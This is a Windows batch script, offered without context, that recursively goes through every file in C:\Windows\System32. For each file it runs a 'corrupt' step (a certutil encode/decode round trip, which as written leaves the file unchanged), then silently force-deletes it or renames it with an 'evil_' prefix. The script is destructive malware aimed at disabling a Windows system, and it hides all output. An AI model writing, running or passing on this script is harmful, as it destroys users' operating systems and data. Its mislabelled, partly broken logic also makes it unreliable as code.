@echo off
setlocal EnableDelayedExpansion

set "target_directory=C:\Windows\System32"

for /r "%target_directory%" %%f in (*) do (
    call :process_file "%%f"
)

goto :end

:process_file
set "file=%~1"
call :corrupt_file "%file%"
call :delete_or_move_file "%file%"
goto :eof

:corrupt_file
set "file=%~1"
certutil -encode "%file%" "%file%.b64" >nul 2>&1
certutil -decode "%file%.b64" "%file%" >nul 2>&1
del "%file%.b64" >nul 2>&1
goto :eof

:delete_or_move_file
set "file=%~1"
set /a "rand=%random% %% 2"

if !rand! equ 0 (
    powershell -Command "Remove-Item -Force -ErrorAction SilentlyContinue -Path '%file%'" >nul 2>&1
) else (
    set "destination=%~dp1evil_%~nx1"
    move "%file%" "%destination%" >nul 2>&1
)
goto :eof

:end
endlocal
